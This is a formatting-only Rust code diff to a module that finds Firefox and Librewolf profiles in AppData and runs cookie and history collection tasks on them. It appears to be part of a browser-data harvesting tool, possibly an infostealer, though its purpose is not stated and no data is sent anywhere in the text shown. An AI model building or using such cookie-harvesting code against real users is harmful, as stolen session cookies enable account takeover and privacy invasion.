@@ -8,13 +8,13 @@ use alloc::sync::Arc;
 use alloc::vec::Vec;
 use collector::Collector;
 use core::ops::Deref;
+use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
-use filesystem::FileSystem;
-use tasks::{composite_task, CompositeTask, Task};
+use tasks::{CompositeTask, Task, composite_task};
 
 pub(crate) struct GeckoTask<'a, C: Collector, F: FileSystem> {
-    tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask<C, F>)>
+    tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask<C, F>)>,
 }
 
 impl<C: Collector + 'static, F: FileSystem + 'static> Default for GeckoTask<'_, C, F> {
@@ -24,7 +24,7 @@ impl<C: Collector + 'static, F: FileSystem + 'static> Default for GeckoTask<'_, 
 
         for base_browser in all_browsers {
             let Some(browser) = get_browser_data(&StorageFileSystem, base_browser) else {
-                continue
+                continue;
             };
 
             let browser = Arc::new(browser);
@@ -34,7 +34,7 @@ impl<C: Collector + 'static, F: FileSystem + 'static> Default for GeckoTask<'_, 
                 composite_task!(
                     CookiesTask::new(browser.clone()),
                     HistoryTask::new(browser.clone()),
-                )
+                ),
             ))
         }
 
@@ -51,26 +51,29 @@ impl<C: Collector, F: FileSystem> Task<C, F> for GeckoTask<'_, C, F> {
     }
 }
 
-fn get_browser_data<'a, F: FileSystem>(fs: &F, browser: GeckoBrowser<'a>) -> Option<GeckoBrowserData<'a>> {
+fn get_browser_data<'a, F: FileSystem>(
+    fs: &F,
+    browser: GeckoBrowser<'a>,
+) -> Option<GeckoBrowserData<'a>> {
     if !fs.is_exists(&browser.base) {
         return None;
     }
-    
+
     let profiles = fs.list_files_filtered(&browser.base / "Profiles", &|f| fs.is_dir(f))?;
-    
+
     if profiles.is_empty() {
         None
     } else {
         Some(GeckoBrowserData {
             inner: browser,
-            profiles
+            profiles,
         })
     }
 }
 
 struct GeckoBrowserData<'a> {
     inner: GeckoBrowser<'a>,
-    profiles: Vec<Path>
+    profiles: Vec<Path>,
 }
 
 impl<'a> Deref for GeckoBrowserData<'a> {
@@ -83,18 +86,21 @@ impl<'a> Deref for GeckoBrowserData<'a> {
 
 struct GeckoBrowser<'a> {
     name: &'a str,
-    base: Path
+    base: Path,
 }
 
 macro_rules! browser {
     ($name:expr, $path:expr) => {
-        GeckoBrowser { name: $name, base: $path }
+        GeckoBrowser {
+            name: $name,
+            base: $path,
+        }
     };
 }
 
 fn get_gecko_browsers<'a>() -> [GeckoBrowser<'a>; 2] {
     let appdata = Path::appdata();
-    
+
     [
         browser!("Firefox", &appdata / "Mozilla" / "Firefox"),
         browser!("Librewolf", &appdata / "librewolf"),
